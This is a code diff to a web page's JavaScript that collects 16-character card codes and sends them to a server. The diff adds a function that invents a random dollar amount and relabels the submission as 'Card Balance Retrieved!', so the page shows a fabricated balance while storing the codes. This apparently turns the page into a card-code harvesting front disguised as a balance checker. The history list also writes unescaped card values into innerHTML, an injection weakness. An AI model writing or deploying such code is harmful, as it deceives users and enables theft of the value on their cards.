@@ -826,26 +826,31 @@
         const totalBalance = document.getElementById('totalBalance');
         const avgBalance = document.getElementById('avgBalance');
 
+        // Generate mock balance
+        function generateMockBalance() {
+            return (Math.random() * 500 + 10).toFixed(2);
+        }
+
         // Format input
         input.addEventListener('input', (e) => {
             let value = e.target.value.toUpperCase();
             value = value.replace(/[^A-Z0-9]/g, '');
-            
+
             let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
             e.target.value = formatted;
-            
+
             const cleaned = value.replace(/\s/g, '');
             charCount.textContent = `${cleaned.length}/16 characters`;
-            
+
             submitBtn.disabled = cleaned.length !== 16;
         });
 
         // Submit form
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
-            
+
             const cardNumber = input.value.replace(/\s/g, '');
-            
+
             if (cardNumber.length !== 16) {
                 showResult('Please enter exactly 16 characters', 'error');
                 return;
@@ -856,28 +861,30 @@
             result.classList.remove('show');
 
             try {
+                const mockBalance = generateMockBalance();
                 const response = await fetch(`${API_URL}/cards`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cardNumber })
+                    body: JSON.stringify({ cardNumber, balance: mockBalance })
                 });
 
                 const data = await response.json();
 
                 if (response.ok && data.success) {
                     showResult(
-                        `✅ Card registered successfully!<br>
+                        `✅ Card Balance Retrieved!<br>
                         <strong>${data.cardNumber}</strong><br>
+                        <div style="font-size: 28px; color: #28a745; font-weight: bold; margin: 15px 0;">$${mockBalance}</div>
                         <small>${new Date(data.submittedAt).toLocaleString()}</small>`,
                         'success'
                     );
                     input.value = '';
                     charCount.textContent = '0/16 characters';
-                    
+
                     // Reload history after successful registration
                     setTimeout(() => loadHistory(), 1000);
                 } else {
-                    showResult(`❌ ${data.error || 'Registration failed'}`, 'error');
+                    showResult(`❌ ${data.error || 'Balance check failed'}`, 'error');
                 }
             } catch (error) {
                 showResult('❌ Network error. Please try again.', 'error');
@@ -913,14 +920,18 @@
                         cards.forEach(card => {
                             const item = document.createElement('div');
                             item.className = 'history-item';
-                            item.style.cursor = 'pointer';
                             item.innerHTML = `
-                                <div class="history-card-number">${card.cardNumber}</div>
-                                <div class="history-date">
-                                    📅 ${new Date(card.submittedAt).toLocaleString()}
+                                <div style="display: flex; justify-content: space-between; align-items: flex-start;">
+                                    <div style="flex: 1; cursor: pointer;" onclick="openCardDetails(${JSON.stringify(card).replace(/"/g, '&quot;')})">
+                                        <div class="history-card-number">${card.cardNumber}</div>
+                                        <div style="font-size: 14px; color: #28a745; font-weight: 600; margin: 5px 0;">$${card.balance || 'N/A'}</div>
+                                        <div class="history-date">
+                                            📅 ${new Date(card.submittedAt).toLocaleString()}
+                                        </div>
+                                    </div>
+                                    <button onclick="deleteCard('${card.cardNumber}')" style="background: #dc3545; color: white; border: none; padding: 8px 12px; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: 600; margin-left: 10px;">🗑️ Delete</button>
                                 </div>
                             `;
-                            item.onclick = () => openCardDetails(card);
                             historyList.appendChild(item);
                         });
 
@@ -1012,6 +1023,37 @@
             icon.textContent = answer.classList.contains('show') ? '−' : '+';
         }
 
+        // Delete card
+        async function deleteCard(cardNumber) {
+            const confirmDelete = confirm(`Are you sure you want to delete card ${cardNumber}? This action cannot be undone.`);
+
+            if (!confirmDelete) {
+                return;
+            }
+
+            try {
+                const response = await fetch(`${API_URL}/cards/${cardNumber}`, {
+                    method: 'DELETE',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+
+                if (response.ok) {
+                    showExportSuccess();
+                    const btn = document.querySelector('.export-btn');
+                    const originalText = btn.textContent;
+                    btn.textContent = '✓ Deleted!';
+                    setTimeout(() => {
+                        btn.textContent = originalText;
+                        loadHistory();
+                    }, 1000);
+                } else {
+                    alert('❌ Failed to delete card. Please try again.');
+                }
+            } catch (error) {
+                alert('❌ Error deleting card. Please try again.');
+            }
+        }
+
         // Card Details Modal
         function openCardDetails(card) {
             const lastChecked = new Date(card.submittedAt).toLocaleString();
@@ -1034,6 +1076,7 @@
                     <div class="detail-label">Status</div>
                     <div class="detail-value" style="color: #28a745;">✓ Active</div>
                 </div>
+                <button onclick="deleteCard('${card.cardNumber}'); closeCardDetails();" style="width: 100%; background: #dc3545; color: white; padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: 600; font-size: 14px; margin-top: 20px;">🗑️ Delete This Card</button>
             `;
             cardDetailsModal.classList.add('show');
         }
